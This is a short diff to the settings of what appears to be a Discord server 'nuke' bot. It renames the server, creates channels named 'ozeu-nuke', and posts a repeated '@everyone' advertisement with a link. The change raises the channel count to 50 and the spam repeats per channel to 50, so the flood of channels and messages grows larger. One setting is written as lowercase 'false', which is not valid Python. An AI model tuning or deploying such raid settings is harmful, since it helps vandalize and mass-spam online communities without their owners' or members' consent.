@@ -25,13 +25,13 @@ INTENTS.members = True
 # --- Names & Counts ---
 GUILD_NEW_NAME         = "おぜう植民地"        # サーバー名
 ROLE_BASE              = "ozeumember"         # ロール名ベース
-ROLE_COUNT             = 5                    # 作成するロール数
+ROLE_COUNT             = 0                    # 作成するロール数
 CHANNEL_BASE           = "ozeu-nuke"          # チャンネル名ベース
-CHANNEL_COUNT          = 20                   # 作成するチャンネル数
+CHANNEL_COUNT          = 50                   # 作成するチャンネル数
 
 # --- Messages ---
 REPEAT_MESSAGE         = "@everyone おぜうの集いに参加！ https://example.com"
-REPEAT_COUNT           = 3                    # 各チャンネルに送信する回数
+REPEAT_COUNT           = 50                    # 各チャンネルに送信する回数
 
 # --- Nicknames ---
 CHANGE_NICKNAMES       = false
